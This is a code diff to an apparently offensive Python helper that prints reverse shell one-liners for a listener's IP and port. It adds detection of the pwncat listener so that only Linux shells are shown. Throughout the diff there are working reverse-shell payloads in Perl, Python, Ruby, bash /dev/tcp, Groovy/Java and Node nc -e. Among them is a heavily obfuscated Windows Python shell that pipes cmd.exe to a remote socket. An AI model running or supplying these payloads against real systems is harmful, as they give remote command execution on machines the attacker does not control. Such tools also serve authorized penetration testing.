@@ -82,7 +82,13 @@ def shell(listener: str='nc -lvnp yyy'):
         with open(os.path.join(ppid_path, 'comm')) as comm:
             if 'rlwrap' in comm.read():
                 rlwrap = True
-                print('Detected rlwrap, only showing universal and Windows only reverse shells.')
+                print('Detected rlwrap, only showing universal and Windows-only reverse shells.')
+
+    # pwncat works only for Linux reverse shells, so we can assume, that the user wants to run a Linux reverse shell
+    pwncat = False
+    if 'pwncat' in listener:
+        pwncat = True
+        print('pwncat works only with Linux, only showing universal and Linux-only reverse shells.')
 
     # Keeping with the random colors, but adding color coding for different OS
     os_colors = sample(color, 3)
@@ -147,7 +153,13 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
     else:
         shells.append("""╔PERL═══════════════════════════════════════════════""")
     shells.append(r"""
-║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""" + windows_color + r"""
+║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""")
+    if pwncat:
+        shells.append("""
+╚═══════════════════════════════════════════════════""")
+    else:
+        shells.append(windows_color)
+        shells.append(r"""
 ╠══════════════╦════════════════════════════════════
 ║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ╚══════════════╩════════════════════════════════════""")
@@ -159,15 +171,19 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ╠═══════════════════════════════════════════════════
 ║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
-    shells.append(windows_color)
-    if not rlwrap:
-        shells.append(r"""
-╠══════════════╦════════════════════════════════════""")
+    if pwncat:
+        shells.append("""
+╚═══════════════════════════════════════════════════""")
     else:
-        shells.append(r"""
+        shells.append(windows_color)
+        if not rlwrap:
+            shells.append(r"""
+╠══════════════╦════════════════════════════════════""")
+        else:
+            shells.append(r"""
 
 ╔PYTHON═════════════════════════════════════════════""")
-    shells.append(r"""
+        shells.append(r"""
 ║ Windows only ║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('xxx', yyy)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ╚══════════════╩════════════════════════════════════""")
     if not rlwrap:
@@ -180,15 +196,19 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 
 ╔RUBY═══════════════════════════════════════════════
 ║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
-    shells.append(windows_color)
-    if not rlwrap:
-        shells.append(r"""
-╠══════════════╦════════════════════════════════════""")
+    if pwncat:
+        shells.append("""
+╚═══════════════════════════════════════════════════""")
     else:
-        shells.append(r"""
+        shells.append(windows_color)
+        if not rlwrap:
+            shells.append(r"""
+╠══════════════╦════════════════════════════════════""")
+        else:
+            shells.append(r"""
 
 ╔RUBY═══════════════════════════════════════════════""")
-    shells.append(r"""
+        shells.append(r"""
 ║ Windows only ║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ╠══════════════╬════════════════════════════════════
 ║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -207,10 +227,11 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ║ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-╚═══════════════════════════════════════════════════""")
-    shells.append(windows_color)
-    shells.append(r"""
-╔JAVA for GROOVY════════════════════════════════════
+╚═══════════════════════════════════════════════════
+╔JAVA for GROOVY════════════════════════════════════""")
+    if not pwncat:
+        shells.append(windows_color)
+        shells.append(r"""
 ║ String host="xxx";
 int port=yyy;
 String cmd="cmd.exe";
@@ -240,7 +261,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
     print(''.join(shells).replace("xxx", ipp).replace("yyy", port))
 
     print(f'{choice(color)}         |--Shell Spawning--|\n')
-    if not rlwrap:
+    if not rlwrap and not pwncat:
         print('For Linux shells use https://github.com/jonasw234/upgrade-tty to upgrade your TTY!\n')
     print(reset_color)
     command = []
